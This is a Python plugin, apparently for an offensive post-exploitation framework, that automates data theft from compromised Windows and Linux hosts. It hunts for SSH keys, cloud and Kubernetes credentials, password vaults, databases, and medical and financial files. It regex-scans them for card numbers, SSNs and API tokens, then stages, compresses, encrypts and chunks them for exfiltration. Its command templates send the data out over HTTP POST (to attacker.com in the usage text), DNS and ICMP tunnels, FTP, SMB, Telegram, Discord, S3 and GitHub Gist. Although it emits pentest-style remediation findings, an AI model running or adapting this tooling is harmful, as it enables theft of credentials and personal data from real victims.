#!/usr/bin/env python3
"""
NexShell Plugin — Data Exfiltrator v3.0 (2026 Edition)
Advanced data discovery, classification, staging, and exfiltration engine.

Coverage:
  - PII/PCI/PHI/IP classification
  - Advanced file discovery (databases, configs, backups, certs, cloud creds)
  - Content scanning (regex, credit cards, API keys, passwords, private keys)
  - Multi-protocol exfiltration (HTTP, DNS, ICMP, FTP, SMB, Cloud, Stego)
  - Evasion techniques (compression, encryption, chunking, rate limiting)
  - Staging area management
  - Exfiltration automation
  - Risk assessment & compliance indicators

MITRE ATT&CK:
  - T1048: Exfiltration Over Alternative Protocol
  - T1041: Exfiltration Over C2 Channel
  - T1030: Data Transfer Size Limits
  - T1567: Exfiltration Over Web Service
  - T1029: Scheduled Transfer
  - T1074: Data Staged
  - T1560: Archive Collected Data
  - T1552: Unsecured Credentials

Usage:
    (NexShell)> plugins run data-exfiltrator
    (NexShell)> plugins run data-exfiltrator --scan-only
    (NexShell)> plugins run data-exfiltrator --classify
    (NexShell)> plugins run data-exfiltrator --stage
    (NexShell)> plugins run data-exfiltrator --exfil --method http --target http://attacker.com
    (NexShell)> plugins run data-exfiltrator --full
"""

import re
import time
import json
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class SensitiveFile:
    """Represents a discovered sensitive file."""
    path: str
    size_bytes: int
    modified: str
    file_type: str
    classification: str  # pii, pci, phi, ip, credential, financial, legal
    sensitivity_score: int  # 0-100
    content_indicators: List[str] = field(default_factory=list)
    compliance_tags: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ContentFinding:
    """Represents sensitive content found in files."""
    file_path: str
    finding_type: str  # credit_card, ssn, api_key, password, private_key, jwt
    value: str
    line_number: int = 0
    context: str = ""
    confidence: str = "medium"  # low, medium, high, verified
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExfiltrationMethod:
    """Represents an exfiltration method."""
    name: str
    protocol: str
    command_template: str
    max_chunk_size: int
    evasion_level: str  # low, medium, high
    detection_risk: str  # low, medium, high
    requires_tool: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class StagingResult:
    """Result of staging operation."""
    staging_path: str
    original_size: int
    compressed_size: int
    encrypted: bool
    chunk_count: int
    checksum: str
    manifest: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExfiltrationResult:
    """Result of exfiltration operation."""
    method: str
    target: str
    files_exfiltrated: int
    total_bytes: int
    duration_seconds: float
    success: bool
    verification: str = ""
    errors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── File Discovery Database ─────────────────────────────────────────────────

class FileDiscoveryDatabase:
    """Comprehensive database of sensitive file patterns."""
    
    WINDOWS_PATTERNS = {
        'documents': {
            'patterns': ['*.docx', '*.doc', '*.xlsx', '*.xls', '*.pptx', '*.ppt', '*.pdf'],
            'paths': ['C:\\Users\\*\\Documents', 'C:\\Users\\*\\Desktop', 'C:\\Users\\*\\Downloads'],
            'classification': 'ip',
            'sensitivity': 60,
        },
        'databases': {
            'patterns': ['*.db', '*.sqlite', '*.sqlite3', '*.sql', '*.mdb', '*.accdb'],
            'paths': ['C:\\Users\\*', 'C:\\ProgramData', 'C:\\inetpub'],
            'classification': 'pii',
            'sensitivity': 90,
        },
        'backups': {
            'patterns': ['*.bak', '*.backup', '*.old', '*.orig', '*.tar.gz', '*.zip', '*.rar', '*.7z'],
            'paths': ['C:\\Users\\*', 'C:\\', 'C:\\Backup'],
            'classification': 'credential',
            'sensitivity': 85,
        },
        'credentials': {
            'patterns': ['*.kdbx', '*.key', '*.pem', '*.p12', '*.pfx', '*.ovpn', '*.rdp'],
            'paths': ['C:\\Users\\*', 'C:\\ProgramData'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'configs': {
            'patterns': ['*.env', '*.conf', '*.ini', '*.yaml', '*.yml', '*.json', '*.xml', '*.config'],
            'paths': ['C:\\inetpub\\wwwroot', 'C:\\Program Files', 'C:\\Users\\*\\AppData'],
            'classification': 'credential',
            'sensitivity': 80,
        },
        'cloud_creds': {
            'patterns': ['credentials', 'config', '*.json'],
            'paths': ['C:\\Users\\*\\.aws', 'C:\\Users\\*\\.gcloud', 'C:\\Users\\*\\.azure'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'ssh_keys': {
            'patterns': ['id_rsa', 'id_ed25519', 'id_ecdsa', '*.pub', 'known_hosts'],
            'paths': ['C:\\Users\\*\\.ssh'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'financial': {
            'patterns': ['*.qbw', '*.qbb', '*.tax', '*.w2', '*.1099'],
            'paths': ['C:\\Users\\*\\Documents'],
            'classification': 'financial',
            'sensitivity': 95,
        },
        'medical': {
            'patterns': ['*.hl7', '*.dicom', '*.medical', '*.patient'],
            'paths': ['C:\\Users\\*\\Documents'],
            'classification': 'phi',
            'sensitivity': 100,
        },
    }
    
    LINUX_PATTERNS = {
        'documents': {
            'patterns': ['*.docx', '*.doc', '*.xlsx', '*.xls', '*.pptx', '*.pdf', '*.odt', '*.ods'],
            'paths': ['/home/*', '/root', '/opt', '/var/www'],
            'classification': 'ip',
            'sensitivity': 60,
        },
        'databases': {
            'patterns': ['*.db', '*.sqlite', '*.sqlite3', '*.sql', '*.dump', '*.mysql', '*.postgres'],
            'paths': ['/home/*', '/root', '/var/lib', '/opt', '/tmp'],
            'classification': 'pii',
            'sensitivity': 90,
        },
        'backups': {
            'patterns': ['*.bak', '*.backup', '*.old', '*.tar.gz', '*.tgz', '*.zip', '*.rar', '*.7z'],
            'paths': ['/home/*', '/root', '/backup', '/var/backups', '/tmp'],
            'classification': 'credential',
            'sensitivity': 85,
        },
        'credentials': {
            'patterns': ['*.kdbx', '*.key', '*.pem', '*.p12', '*.pfx', '*.ovpn', '*.ppk'],
            'paths': ['/home/*', '/root', '/etc', '/opt'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'configs': {
            'patterns': ['*.env', '*.conf', '*.ini', '*.yaml', '*.yml', '*.json', '*.xml', '*.cfg'],
            'paths': ['/home/*', '/root', '/etc', '/opt', '/var/www'],
            'classification': 'credential',
            'sensitivity': 80,
        },
        'cloud_creds': {
            'patterns': ['credentials', 'config', '*.json'],
            'paths': ['/home/*/.aws', '/home/*/.gcloud', '/home/*/.azure', '/root/.aws'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'ssh_keys': {
            'patterns': ['id_rsa', 'id_ed25519', 'id_ecdsa', '*.pub', 'known_hosts', 'authorized_keys'],
            'paths': ['/home/*/.ssh', '/root/.ssh'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'docker_secrets': {
            'patterns': ['*.env', '*.secret', '*.key'],
            'paths': ['/run/secrets', '/var/run/secrets'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'k8s_secrets': {
            'patterns': ['token', 'ca.crt', '*.kubeconfig'],
            'paths': ['/var/run/secrets/kubernetes.io', '/home/*/.kube'],
            'classification': 'credential',
            'sensitivity': 100,
        },
        'git_repos': {
            'patterns': ['.git/config', '.env', '*.key', '*.pem'],
            'paths': ['/home/*', '/root', '/opt', '/var/www'],
            'classification': 'credential',
            'sensitivity': 90,
        },
        'logs': {
            'patterns': ['*.log', '*.out', '*.err'],
            'paths': ['/var/log', '/home/*', '/root'],
            'classification': 'pii',
            'sensitivity': 70,
        },
    }
    
    @classmethod
    def get_patterns(cls, platform: str) -> Dict:
        return cls.WINDOWS_PATTERNS if platform == 'windows' else cls.LINUX_PATTERNS


# ── Content Scanner ─────────────────────────────────────────────────────────

class ContentScanner:
    """Scans file content for sensitive data patterns."""
    
    # Regex patterns for sensitive data
    PATTERNS = {
        'credit_card': {
            'regex': r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b',
            'description': 'Credit Card Number',
            'compliance': ['PCI-DSS'],
            'sensitivity': 100,
        },
        'ssn': {
            'regex': r'\b\d{3}-\d{2}-\d{4}\b',
            'description': 'Social Security Number',
            'compliance': ['PII', 'HIPAA'],
            'sensitivity': 100,
        },
        'aws_access_key': {
            'regex': r'AKIA[0-9A-Z]{16}',
            'description': 'AWS Access Key ID',
            'compliance': ['Cloud Security'],
            'sensitivity': 100,
        },
        'aws_secret_key': {
            'regex': r'(?i)aws_secret_access_key\s*[=:]\s*[A-Za-z0-9/+=]{40}',
            'description': 'AWS Secret Access Key',
            'compliance': ['Cloud Security'],
            'sensitivity': 100,
        },
        'private_key': {
            'regex': r'-----BEGIN (?:RSA|EC|DSA|OPENSSH) PRIVATE KEY-----',
            'description': 'Private Key',
            'compliance': ['Cryptographic Material'],
            'sensitivity': 100,
        },
        'jwt_token': {
            'regex': r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
            'description': 'JWT Token',
            'compliance': ['Authentication'],
            'sensitivity': 90,
        },
        'github_token': {
            'regex': r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}',
            'description': 'GitHub Personal Access Token',
            'compliance': ['Source Code'],
            'sensitivity': 95,
        },
        'slack_token': {
            'regex': r'xox[baprs]-[A-Za-z0-9-]+',
            'description': 'Slack Token',
            'compliance': ['Communication'],
            'sensitivity': 85,
        },
        'generic_password': {
            'regex': r'(?i)(?:password|passwd|pwd|secret|api_key|apikey|token)\s*[=:]\s*[\'"]?([^\s\'"]{8,})',
            'description': 'Generic Password/Secret',
            'compliance': ['Credentials'],
            'sensitivity': 90,
        },
        'email': {
            'regex': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'description': 'Email Address',
            'compliance': ['PII', 'GDPR'],
            'sensitivity': 60,
        },
        'phone': {
            'regex': r'\b(?:\+?1[-.]?)?\(?[0-9]{3}\)?[-.]?[0-9]{3}[-.]?[0-9]{4}\b',
            'description': 'Phone Number',
            'compliance': ['PII'],
            'sensitivity': 70,
        },
        'ip_address': {
            'regex': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
            'description': 'IP Address',
            'compliance': ['Network'],
            'sensitivity': 50,
        },
        'connection_string': {
            'regex': r'(?i)(?:mongodb|postgres|mysql|sqlserver):\/\/[^:\s]+:[^@\s]+@[^\s]+',
            'description': 'Database Connection String',
            'compliance': ['Database'],
            'sensitivity': 95,
        },
    }
    
    @classmethod
    def scan_file_content(cls, exec_func, session, file_path: str, platform: str) -> List[ContentFinding]:
        """Scan file content for sensitive data."""
        findings = []
        
        # Read file content (first 10KB for performance)
        if platform == 'windows':
            cmd = f"powershell -nop -c \"Get-Content '{file_path}' -TotalCount 200 -ErrorAction SilentlyContinue\""
        else:
            cmd = f"head -200 {file_path} 2>/dev/null"
        
        content = exec_func(session, cmd)
        if not content:
            return findings
        
        # Scan for each pattern
        for finding_type, pattern_info in cls.PATTERNS.items():
            regex = pattern_info['regex']
            matches = re.finditer(regex, content, re.MULTILINE | re.IGNORECASE)
            
            for match in matches:
                value = match.group(0)
                # Truncate long values
                if len(value) > 50:
                    value = value[:50] + "..."
                
                findings.append(ContentFinding(
                    file_path=file_path,
                    finding_type=finding_type,
                    value=value,
                    context=content[max(0, match.start()-20):match.end()+20],
                    confidence='high' if finding_type in ['credit_card', 'private_key', 'aws_access_key'] else 'medium',
                ))
        
        return findings


# ── Exfiltration Methods Database ───────────────────────────────────────────

class ExfiltrationMethods:
    """Database of exfiltration methods."""
    
    METHODS = {
        'http_post': ExfiltrationMethod(
            name='HTTP POST',
            protocol='HTTP/HTTPS',
            command_template='base64 {file} | curl -X POST -d @- {target}',
            max_chunk_size=1048576,  # 1MB
            evasion_level='low',
            detection_risk='high',
        ),
        'http_multipart': ExfiltrationMethod(
            name='HTTP Multipart',
            protocol='HTTP/HTTPS',
            command_template='curl -X POST -F "file=@{file}" {target}',
            max_chunk_size=10485760,  # 10MB
            evasion_level='low',
            detection_risk='high',
        ),
        'dns_txt': ExfiltrationMethod(
            name='DNS TXT Record',
            protocol='DNS',
            command_template='xxd -p -c 30 {file} | while read line; do dig TXT $line.{domain} +short; done',
            max_chunk_size=63,  # DNS label limit
            evasion_level='high',
            detection_risk='medium',
            requires_tool='dig',
        ),
        'dns_tunnel': ExfiltrationMethod(
            name='DNS Tunnel (iodine)',
            protocol='DNS',
            command_template='iodine -f -r {domain}',
            max_chunk_size=256,
            evasion_level='high',
            detection_risk='low',
            requires_tool='iodine',
        ),
        'icmp_tunnel': ExfiltrationMethod(
            name='ICMP Tunnel',
            protocol='ICMP',
            command_template='ping -c 1 -p $(xxd -p -c 16 {file} | head -1) {target}',
            max_chunk_size=16,
            evasion_level='high',
            detection_risk='medium',
        ),
        'ftp': ExfiltrationMethod(
            name='FTP Upload',
            protocol='FTP',
            command_template='curl -T {file} ftp://{target}/{filename}',
            max_chunk_size=104857600,  # 100MB
            evasion_level='low',
            detection_risk='high',
        ),
        'smb': ExfiltrationMethod(
            name='SMB/CIFS Copy',
            protocol='SMB',
            command_template='smbclient //{target}/share -c "put {file}"',
            max_chunk_size=104857600,
            evasion_level='low',
            detection_risk='medium',
            requires_tool='smbclient',
        ),
        'email': ExfiltrationMethod(
            name='Email Attachment',
            protocol='SMTP',
            command_template='echo "Subject: Data\\n\\nAttachment" | mutt -s "Data" -a {file} -- {email}',
            max_chunk_size=26214400,  # 25MB
            evasion_level='medium',
            detection_risk='high',
            requires_tool='mutt',
        ),
        'cloud_s3': ExfiltrationMethod(
            name='AWS S3 Upload',
            protocol='HTTPS',
            command_template='aws s3 cp {file} s3://{bucket}/{filename}',
            max_chunk_size=5368709120,  # 5GB
            evasion_level='medium',
            detection_risk='low',
            requires_tool='aws',
        ),
        'telegram': ExfiltrationMethod(
            name='Telegram Bot',
            protocol='HTTPS',
            command_template='curl -X POST "https://api.telegram.org/bot{token}/sendDocument" -F chat_id={chat_id} -F document=@{file}',
            max_chunk_size=52428800,  # 50MB
            evasion_level='medium',
            detection_risk='medium',
        ),
        'discord': ExfiltrationMethod(
            name='Discord Webhook',
            protocol='HTTPS',
            command_template='curl -H "Content-Type: multipart/form-data" -F "file=@{file}" {webhook_url}',
            max_chunk_size=8388608,  # 8MB
            evasion_level='medium',
            detection_risk='medium',
        ),
        'github_gist': ExfiltrationMethod(
            name='GitHub Gist',
            protocol='HTTPS',
            command_template='echo "$(cat {file})" | gh gist create -',
            max_chunk_size=10485760,
            evasion_level='medium',
            detection_risk='low',
            requires_tool='gh',
        ),
    }
    
    @classmethod
    def get_method(cls, method_name: str) -> Optional[ExfiltrationMethod]:
        return cls.METHODS.get(method_name)
    
    @classmethod
    def get_all_methods(cls) -> Dict[str, ExfiltrationMethod]:
        return cls.METHODS


# ── Staging Engine ──────────────────────────────────────────────────────────

class StagingEngine:
    """Handles data staging, compression, encryption, and chunking."""
    
    @staticmethod
    def create_staging_area(exec_func, session, platform: str) -> str:
        """Create a staging area for data preparation."""
        staging_path = '/tmp/.nexshell_staging' if platform == 'linux' else 'C:\\Windows\\Temp\\.nexshell_staging'
        
        if platform == 'windows':
            cmd = f"powershell -nop -c \"New-Item -ItemType Directory -Path '{staging_path}' -Force | Out-Null; Write-Output '{staging_path}'\""
        else:
            cmd = f"mkdir -p {staging_path} && echo {staging_path}"
        
        out = exec_func(session, cmd)
        return out.strip() if out else staging_path
    
    @staticmethod
    def compress_data(exec_func, session, file_path: str, staging_path: str, platform: str) -> Tuple[str, int, int]:
        """Compress file using gzip/tar."""
        filename = file_path.split('/')[-1] if '/' in file_path else file_path.split('\\')[-1]
        compressed_path = f"{staging_path}/{filename}.gz"
        
        if platform == 'windows':
            cmd = f"powershell -nop -c \"Compress-Archive -Path '{file_path}' -DestinationPath '{compressed_path}' -Force; (Get-Item '{compressed_path}').Length\""
        else:
            cmd = f"gzip -c {file_path} > {compressed_path} && stat -c %s {compressed_path}"
        
        out = exec_func(session, cmd)
        compressed_size = int(out.strip()) if out and out.strip().isdigit() else 0
        
        # Get original size
        if platform == 'windows':
            cmd = f"powershell -nop -c \"(Get-Item '{file_path}').Length\""
        else:
            cmd = f"stat -c %s {file_path}"
        
        out = exec_func(session, cmd)
        original_size = int(out.strip()) if out and out.strip().isdigit() else 0
        
        return compressed_path, original_size, compressed_size
    
    @staticmethod
    def encrypt_data(exec_func, session, file_path: str, password: str, platform: str) -> str:
        """Encrypt file using OpenSSL."""
        encrypted_path = f"{file_path}.enc"
        
        if platform == 'windows':
            cmd = f"powershell -nop -c \"openssl enc -aes-256-cbc -salt -in '{file_path}' -out '{encrypted_path}' -k '{password}'\""
        else:
            cmd = f"openssl enc -aes-256-cbc -salt -in {file_path} -out {encrypted_path} -k {password}"
        
        exec_func(session, cmd)
        return encrypted_path
    
    @staticmethod
    def chunk_data(exec_func, session, file_path: str, chunk_size: int, staging_path: str, platform: str) -> List[str]:
        """Split file into chunks."""
        chunks = []
        
        if platform == 'windows':
            cmd = f"powershell -nop -c \"Split-Path '{file_path}' -Leaf\""
        else:
            cmd = f"basename {file_path}"
        
        filename = exec_func(session, cmd).strip()
        
        if platform == 'windows':
            cmd = f"powershell -nop -c \"$bytes = [IO.File]::ReadAllBytes('{file_path}'); $chunkSize = {chunk_size}; $i = 0; for($j=0; $j -lt $bytes.Length; $j+=$chunkSize){{ $chunk = $bytes[$j..($j+$chunkSize-1)]; [IO.File]::WriteAllBytes('{staging_path}\\{filename}.part' + $i, $chunk); $i++ }}; Write-Output $i\""
        else:
            cmd = f"split -b {chunk_size} {file_path} {staging_path}/{filename}.part && ls {staging_path}/{filename}.part* | wc -l"
        
        out = exec_func(session, cmd)
        chunk_count = int(out.strip()) if out and out.strip().isdigit() else 0
        
        for i in range(chunk_count):
            chunks.append(f"{staging_path}/{filename}.part{i}" if platform == 'linux' else f"{staging_path}\\{filename}.part{i}")
        
        return chunks
    
    @staticmethod
    def calculate_checksum(exec_func, session, file_path: str, platform: str) -> str:
        """Calculate SHA256 checksum."""
        if platform == 'windows':
            cmd = f"powershell -nop -c \"(Get-FileHash '{file_path}' -Algorithm SHA256).Hash\""
        else:
            cmd = f"sha256sum {file_path} | awk '{{print $1}}'"
        
        out = exec_func(session, cmd)
        return out.strip() if out else ""


# ── Main Plugin ─────────────────────────────────────────────────────────────

class DataExfiltrator(NexPlugin):
    name        = "data-exfiltrator"
    description = "Advanced data discovery, classification, staging, and exfiltration engine"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "exfiltration"
    mitre_id    = "T1048"
    
    def run(self, session, args: list):
        # Parse args
        scan_only = '--scan-only' in (args or [])
        classify_only = '--classify' in (args or [])
        stage_mode = '--stage' in (args or [])
        exfil_mode = '--exfil' in (args or [])
        full_mode = '--full' in (args or [])
        method_name = 'http_post'
        target = ''
        
        for a in (args or []):
            if a.startswith('--method='):
                method_name = a.split('=', 1)[1]
            elif a.startswith('--target='):
                target = a.split('=', 1)[1]
        
        if full_mode:
            scan_only = classify_only = stage_mode = exfil_mode = True
        
        if not scan_only and not classify_only and not stage_mode and not exfil_mode:
            scan_only = classify_only = True  # Default
        
        self.info(f"📤 Starting Data Exfiltrator v3.0 (mode: scan={scan_only}, classify={classify_only}, stage={stage_mode}, exfil={exfil_mode})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [📤 Data Exfiltrator v3.0 — Advanced Discovery & Exfiltration]")
        sections.append("━"*64)
        
        # ── Step 1: Platform detection ──────────────────────────────────
        platform = self._detect_platform(session)
        sections.append(f"  Platform: {platform.upper()}")
        
        # ── Step 2: File Discovery ──────────────────────────────────────
        sections.append("\n[*] Phase 1: Sensitive File Discovery")
        sections.append("─"*64)
        
        patterns_db = FileDiscoveryDatabase.get_patterns(platform)
        discovered_files = []
        
        for category, info in patterns_db.items():
            sections.append(f"\n  [{category.upper()}] Scanning...")
            
            for path in info['paths']:
                for pattern in info['patterns']:
                    if platform == 'windows':
                        cmd = f"powershell -nop -c \"Get-ChildItem -Path '{path}' -Filter '{pattern}' -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | Format-Table -AutoSize\" 2>nul | head -20"
                    else:
                        resolved_path = path.replace('*', '')
                        cmd = f"find {resolved_path} -maxdepth 4 -name '{pattern}' -type f 2>/dev/null | head -20"
                    
                    out = self._exec(session, cmd)
                    if out and out.strip():
                        for line in out.strip().split('\n'):
                            if line.strip() and ('/' in line or '\\' in line):
                                file_path = line.strip().split()[0] if ' ' in line else line.strip()
                                discovered_files.append(SensitiveFile(
                                    path=file_path,
                                    size_bytes=0,  # Will be filled later
                                    modified="",
                                    file_type=pattern,
                                    classification=info['classification'],
                                    sensitivity_score=info['sensitivity'],
                                ))
        
        sections.append(f"\n  [+] Total files discovered: {len(discovered_files)}")
        
        # Group by classification
        by_classification = defaultdict(list)
        for f in discovered_files:
            by_classification[f.classification].append(f)
        
        for classification, files in by_classification.items():
            icon = {'credential': '🔑', 'pii': '👤', 'pci': '💳', 'phi': '🏥', 'ip': '💼', 'financial': '💰', 'legal': '⚖️'}.get(classification, '📄')
            sections.append(f"    {icon} {classification.upper()}: {len(files)} files")
        
        # ── Step 3: Content Scanning ────────────────────────────────────
        if classify_only and discovered_files:
            sections.append("\n[*] Phase 2: Content Scanning & Classification")
            sections.append("─"*64)
            
            content_findings = []
            
            for file in discovered_files[:20]:  # Limit to 20 files for performance
                findings = ContentScanner.scan_file_content(self._exec, session, file.path, platform)
                if findings:
                    content_findings.extend(findings)
                    file.content_indicators = list(set([f.finding_type for f in findings]))
                    
                    # Update compliance tags
                    for finding in findings:
                        pattern_info = ContentScanner.PATTERNS.get(finding.finding_type, {})
                        file.compliance_tags.extend(pattern_info.get('compliance', []))
            
            sections.append(f"  [+] Content findings: {len(content_findings)}")
            
            # Group by type
            by_type = defaultdict(list)
            for f in content_findings:
                by_type[f.finding_type].append(f)
            
            for finding_type, findings in by_type.items():
                pattern_info = ContentScanner.PATTERNS.get(finding_type, {})
                sections.append(f"    • {pattern_info.get('description', finding_type)}: {len(findings)} occurrences")
        
        # ── Step 4: Staging ─────────────────────────────────────────────
        if stage_mode and discovered_files:
            sections.append("\n[*] Phase 3: Data Staging")
            sections.append("─"*64)
            
            staging_path = StagingEngine.create_staging_area(self._exec, session, platform)
            sections.append(f"  Staging area: {staging_path}")
            
            staged_files = []
            
            for file in discovered_files[:10]:  # Limit to 10 files
                sections.append(f"\n  [*] Staging: {file.path}")
                
                # Compress
                compressed_path, orig_size, comp_size = StagingEngine.compress_data(
                    self._exec, session, file.path, staging_path, platform
                )
                sections.append(f"    Compressed: {orig_size} → {comp_size} bytes ({int((1 - comp_size/max(orig_size,1)) * 100)}% reduction)")
                
                # Calculate checksum
                checksum = StagingEngine.calculate_checksum(self._exec, session, compressed_path, platform)
                sections.append(f"    Checksum: {checksum[:16]}...")
                
                staged_files.append({
                    'original': file.path,
                    'compressed': compressed_path,
                    'original_size': orig_size,
                    'compressed_size': comp_size,
                    'checksum': checksum,
                })
            
            sections.append(f"\n  [+] Staged {len(staged_files)} files")
        
        # ── Step 5: Exfiltration ────────────────────────────────────────
        if exfil_mode and target:
            sections.append("\n[*] Phase 4: Data Exfiltration")
            sections.append("─"*64)
            
            method = ExfiltrationMethods.get_method(method_name)
            if not method:
                sections.append(f"  [!] Unknown method: {method_name}")
            else:
                sections.append(f"  Method: {method.name}")
                sections.append(f"  Protocol: {method.protocol}")
                sections.append(f"  Target: {target}")
                sections.append(f"  Detection Risk: {method.detection_risk}")
                
                sections.append("\n  Exfiltration Commands:")
                for file in discovered_files[:5]:
                    cmd = method.command_template.format(
                        file=file.path,
                        target=target,
                        domain=target,
                        filename=file.path.split('/')[-1] if '/' in file.path else file.path.split('\\')[-1],
                    )
                    sections.append(f"    > {cmd}")
        
        # ── Step 6: Generate findings ───────────────────────────────────
        sections.append("\n[*] Phase 5: Generating Findings")
        sections.append("─"*64)
        
        findings_created = 0
        
        if discovered_files:
            # High-sensitivity files
            high_sensitivity = [f for f in discovered_files if f.sensitivity_score >= 90]
            if high_sensitivity:
                self.finding(
                    title=f"High-Sensitivity Data Discovered — {len(high_sensitivity)} files",
                    description=f"Found {len(high_sensitivity)} files with sensitivity score >= 90:\n" +
                               "\n".join(f"  • {f.path} ({f.classification})" for f in high_sensitivity[:10]),
                    severity="Critical",
                    recommendation="Encrypt sensitive data at rest. Implement DLP (Data Loss Prevention). Restrict access with ACLs.",
                    mitre_id="T1074",
                )
                findings_created += 1
                sections.append(f"  [CRITICAL] {len(high_sensitivity)} high-sensitivity files")
            
            # Credential files
            credential_files = [f for f in discovered_files if f.classification == 'credential']
            if credential_files:
                self.finding(
                    title=f"Credential Files Discovered — {len(credential_files)} files",
                    description=f"Found {len(credential_files)} credential files:\n" +
                               "\n".join(f"  • {f.path}" for f in credential_files[:10]),
                    severity="Critical",
                    recommendation="Rotate all credentials immediately. Use secrets manager. Implement credential vaulting.",
                    mitre_id="T1552",
                )
                findings_created += 1
                sections.append(f"  [CRITICAL] {len(credential_files)} credential files")
            
            # Content findings
            if classify_only and content_findings:
                self.finding(
                    title=f"Sensitive Content Detected — {len(content_findings)} findings",
                    description=f"Detected sensitive content in files:\n" +
                               "\n".join(f"  • {f.finding_type}: {f.value[:30]}... in {f.file_path}" for f in content_findings[:10]),
                    severity="High",
                    recommendation="Remove sensitive data from files. Implement data masking. Use encryption.",
                    mitre_id="T1552",
                )
                findings_created += 1
                sections.append(f"  [HIGH] {len(content_findings)} content findings")
        
        # ── Step 7: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Exfiltration Summary]")
        sections.append("━"*64)
        sections.append(f"  Files Discovered: {len(discovered_files)}")
        sections.append(f"  Content Findings: {len(content_findings) if classify_only else 0}")
        sections.append(f"  Classifications: {', '.join(by_classification.keys()) if discovered_files else 'N/A'}")
        sections.append(f"  Compliance Tags: {', '.join(set(t for f in discovered_files for t in f.compliance_tags)) if discovered_files else 'N/A'}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Step 8: Save to loot ────────────────────────────────────────
        self.loot(
            {
                "type": "data_exfiltration_scan",
                "platform": platform,
                "files_discovered": len(discovered_files),
                "content_findings": len(content_findings) if classify_only else 0,
                "files": [f.to_dict() for f in discovered_files[:50]],
                "content": [f.to_dict() for f in content_findings[:50]] if classify_only else [],
                "classifications": {k: len(v) for k, v in by_classification.items()},
                "findings_count": findings_created,
                "duration": duration,
            },
            category='exfiltration',
            source='data-exfiltrator',
            confidence='high'
        )
        
        self.info(f"📤 Data exfiltrator complete — {len(discovered_files)} files, {findings_created} findings")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''